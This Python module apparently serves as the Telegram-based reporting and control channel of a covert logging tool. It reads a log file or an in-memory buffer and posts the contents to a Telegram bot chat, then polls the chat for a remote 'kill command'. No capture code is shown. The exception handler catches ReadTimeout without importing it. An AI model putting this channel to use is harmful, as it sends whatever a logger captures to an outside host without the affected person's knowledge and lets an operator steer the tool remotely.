import requests
import time
from config import TOKEN
from config import chat_id

last_update_id = 0

debugging = 1

def initChatID():
    return

def sendFromFile(LOG_FILE):
    global chat_id

    #get the text from the file...
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as file:
            text = file.read()
    except Exception as e:
        raise RuntimeError(f"Error reading file: {e}")

    #... to send to the bot
    send_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    params = {"chat_id": chat_id, "text": text}
    response = requests.get(send_url, params=params)

    if debugging:
        if response.status_code == 200:
            print("[++]Message sent successfully")
        else:
            print("[--]Error sending message", response.text)

def sendFromBuffer(buffer):
    text=''.join(buffer)
    print(f"got: {text}")
    # send the text to the bot
    send_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    params = {"chat_id": chat_id, "text": text}
    response = requests.get(send_url, params=params)

    if debugging:
        if response.status_code == 200:
            print("[++]Message sent successfully")
        else:
            print("[--]Error sending message", response.text)

#to not check for previous kill command
def syncWithLatestUpdate():
    global last_update_id
    resp = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates")
    resp.raise_for_status()
    data = resp.json()

    if not data['result']:
        last_update_id = 0
    else:
        last_update_id = data['result'][-1]['update_id']

def waitNewMsg(timeout=10, retry_delay=1):
    global last_update_id
    end_time = time.time() + timeout

    while time.time() < end_time:
        params = {
            "offset": last_update_id + 1,
            "timeout": timeout,
        }
        params = {k: v for k, v in params.items() if v is not None}

        try:
            # split connect/read so we don't accidentally timeout early
            resp = requests.get(
                f"https://api.telegram.org/bot{TOKEN}/getUpdates",
                params=params,
                timeout=(3, timeout + 1)
            )
            resp.raise_for_status()
        except ReadTimeout:
            # No data from Telegram yet – just retry until end_time
            time.sleep(retry_delay)
            continue

        resp.raise_for_status()
        updates = resp.json().get("result", [])
        
        if updates:
            last_update_id = updates[-1]["update_id"]
            for u in updates:
                post = u.get("channel_post")
                if post and post["chat"].get("username", "").lower() == chat_id.lstrip("@"):
                    return post.get("text")
        time.sleep(retry_delay)

    return None

